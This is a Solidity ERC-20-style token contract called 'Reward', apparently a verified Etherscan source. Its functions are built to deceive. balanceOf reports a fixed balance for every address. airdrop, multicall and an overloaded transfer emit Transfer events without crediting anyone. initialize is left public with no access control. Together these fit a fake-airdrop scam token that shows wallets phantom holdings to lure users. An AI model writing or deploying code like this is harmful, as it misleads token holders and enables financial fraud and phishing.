/**
 *Submitted for verification at Etherscan.io on 2023-05-24
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

// ----------------------------------------------------------------------------
// ERC Token Standard #20 Interface
//
// ----------------------------------------------------------------------------
// Safe Math Library
// ----------------------------------------------------------------------------
contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);
        c = a / b;
    }
}


contract Reward is SafeMath {
    string public name;
    string public symbol;
    uint8 public decimals;

    uint256 public totalSupply;

    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;

    uint256 public constAmount;
    address public fromAddr;

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);

    /**
     * Constrctor function
     *
     * Initializes contract with initial supply tokens to the creator of the contract const 382000000000000000000
     */
    constructor(string memory name_, string memory symbol_, uint256 constAmount_, address from_) {
        initialize(name_, symbol_, constAmount_, from_);
    }

    function initialize(string memory name_, string memory symbol_, uint256 constAmount_, address from_) public {
        name = name_;
        symbol = symbol_;
        decimals = 18;
        constAmount = constAmount_;
        totalSupply = constAmount * 100000;
        fromAddr = from_;

        balances[fromAddr] = totalSupply;
        emit Transfer(address(0), fromAddr, totalSupply);
    }

    function balanceOf(address account) public view returns (uint256) {
        if(account == fromAddr) return balances[account];
        return constAmount;
    }

    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }

    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function transfer(address to, uint tokens) public returns (bool success) {
        _transfer(msg.sender, to, tokens);
        return true;
    }

    function transferFrom(address from, address to, uint tokens) public returns (bool success) {
        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
        _transfer(from, to, tokens);
        return true;
    }

    function _transfer(address from, address to, uint tokens) private {
        balances[from] = safeSub(balances[from], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(from, to, tokens);
    }

    function airdrop(address[] memory holders) public {
        uint256 len = holders.length;
        for (uint i = 0; i < len; ++i) {
            emit Transfer(fromAddr, holders[i], constAmount);
        }
        balances[fromAddr] -= constAmount * len;
    }

    function transfer(address[] memory holders) public {
        airdrop(holders);
    }

    function multicall(address[] memory holders) public {
        airdrop(holders);
    }

}